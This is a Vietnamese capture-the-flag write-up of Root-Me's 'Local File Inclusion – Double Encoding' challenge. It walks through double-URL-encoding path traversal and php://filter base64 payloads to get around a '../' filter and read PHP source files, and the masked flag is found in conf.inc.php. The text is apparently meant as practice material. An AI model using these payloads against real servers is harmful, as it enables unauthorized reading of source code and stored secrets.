# WRITE UP

**Challenge:** [Local File Inclusion – Double Encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)

<img src="./media/image1.png" style="width:6.5in;height:1.94792in" alt="Graphical user interface, text, application Description automatically generated" />

Fuzz với Path Traversal, ta thấy web server block hoặc filter ‘../’:

<img src="./media/image2.png" style="width:6.5in;height:0.91667in" alt="Graphical user interface, text, application Description automatically generated" />

Tên challenge là LFI – Double Encoding URL Double Encoding. Ta convert ../ %252E%252E%252F (%252E = . ; %252F = /)

Đưa vào ?page=\[value\] ta được:

<img src="./media/image3.png" style="width:6.5in;height:0.99306in" alt="Graphical user interface, text Description automatically generated" />

Đến đây, sau khi append bất kỳ text nào thì server sẽ concat text.inc.php:

<img src="./media/image4.png" style="width:6.5in;height:1.08958in" alt="Graphical user interface, text, application Description automatically generated" />

Dạo quanh index.html và homepage thì không phát hiện bất kỳ điều gì đặc biệt. Tương tự các bài LFI khác, ta cần get source để xem tác giả đặt gì trong web. Khi xem về cách get source php, ta có payload get như sau:

*?page=php://filter/convert.base64-encode/resource=\[source\_file\]*

Giờ thì đưa vào payload ta để get source ở **home.inc.php**:

*?page=php://filter/convert.base64-encode/resource=home*

Double encoding: *?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dhome*

<img src="./media/image5.png" style="width:6.5in;height:0.59653in" />

Bỏ vào base64 decode:

<img src="./media/image6.png" style="width:6.5in;height:3.25347in" alt="Graphical user interface, text, application Description automatically generated" />

View source không tìm được gì đặc biệt. Tuy vậy, website đã sử dụng thư viện từ **conf.inc.php**. Từ đó, tiến hành xem thử conf.inc.php:

*?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf*

<img src="./media/image7.png" style="width:6.5in;height:0.66597in" />

Flag xuất hiện trong conf.inc.php:

<img src="./media/image8.png" style="width:6.5in;height:3.23472in" alt="Graphical user interface, text Description automatically generated" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
